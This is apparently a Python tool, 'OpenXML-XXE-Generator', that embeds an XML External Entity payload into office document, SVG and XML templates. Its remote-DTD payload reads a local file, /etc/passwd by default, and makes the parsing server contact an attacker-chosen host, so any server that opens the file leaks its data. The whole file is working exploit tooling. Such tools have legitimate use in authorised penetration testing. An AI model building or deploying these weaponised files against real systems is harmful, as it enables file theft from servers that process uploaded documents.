import argparse

payloads = {
    "rdtd": {
        "description": "A Remote DTD causes the XML parser to make an external connection when successful.",
        "payload": '<!DOCTYPE root [ <!ENTITY % start "<![CDATA["><!ENTITY % stuff SYSTEM "file://__EXFILE__"><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "__PROTOCOL____HOST__">%dtd;]>',
        "entity": "&xxe;",
    }
}

filetypes = {
    "docx": "samples/docx/template.docx",
    "xlsx": "samples/xlsx/template.xlsx",
    "odg": "samples/template.odg",
    "odp": "samples/template.odp",
    "ods": "samples/template.ods",
    "odt": "samples/template.odt",
    "pptx": "samples/template.pptx",
    "svg": "samples/template.svg",
    "xml": "samples/template.xml",
}


class XXeFile:
    def __init__(
        self, host, protocol, filetype, payload, outfile=None, exfile=None
    ):
        if not host:
            raise KeyError("Please specify a valid host")
        if not protocol:
            raise KeyError("Please specify a valid protocol")
        if not filetype:
            raise KeyError("Please specify a valid filetype")
        if not payload:
            raise KeyError("Please specify a valid payload")
        if not filetype in filetypes:
            raise KeyError("Please specify a valid filetype")
        if not payload in payloads:
            raise KeyError("Please specify a valid payload")

        self.host = host
        self.protocol = protocol
        self.filetype = filetype
        self.template = filetypes[filetype]
        self.payload = payloads[payload]["payload"]
        self.description = payloads[payload]["description"]
        self.outfile = outfile
        self.exfile = exfile

    def generate_payload(self):
        with open(self.template, "rb") as tmpl:
            tempdat = tmpl.read().decode("utf8")
            if "__HOST__" in self.payload:
                self.payload = self.payload.replace("__HOST__", self.host)
            if "__PROTOCOL__" in self.payload:
                self.payload = self.payload.replace(
                    "__PROTOCOL__", self.protocol
                )
            if "__EXFILE__" in self.payload:
                self.payload = self.payload.replace("__EXFILE__", self.exfile)
            tempdat = tempdat.replace("__PAYLOAD__", self.payload)
            return tempdat

    @property
    def to_file(self):
        tempdat = self.generate_payload()
        with open(self.outfile, "wb") as out:
            out.write(bytes(tempdat, "utf8"))

    @property
    def to_text(self):
        tempdat = self.generate_payload()
        print(tempdat)


def main():
    parser = argparse.ArgumentParser(
        description="OpenXML-XXE-Generator by Richard Clifford & Jordy Zomer"
    )
    parser.add_argument(
        "--host", type=str, help="The host to use in your payloads"
    )
    parser.add_argument(
        "--protocol",
        type=str,
        help="The protocol to use in your payloads",
        default="http://",
    )
    parser.add_argument(
        "--type", type=str, help="The type to use in your payloads"
    )
    parser.add_argument(
        "--payload", type=str, help="The payload to use in your payloads"
    )
    parser.add_argument(
        "--outfile", type=str, help="The outfile to use in your outfiles"
    )
    parser.add_argument(
        "--exfile",
        type=str,
        required=False,
        help="The file you want to extract",
        default="/etc/passwd",
    )
    args = parser.parse_args()

    obj = XXeFile(
        args.host,
        args.protocol,
        args.type,
        args.payload,
        args.outfile,
        args.exfile,
    )

    if obj.outfile is None:
        obj.to_text
    else:
        obj.to_file


if __name__ == "__main__":
    main()
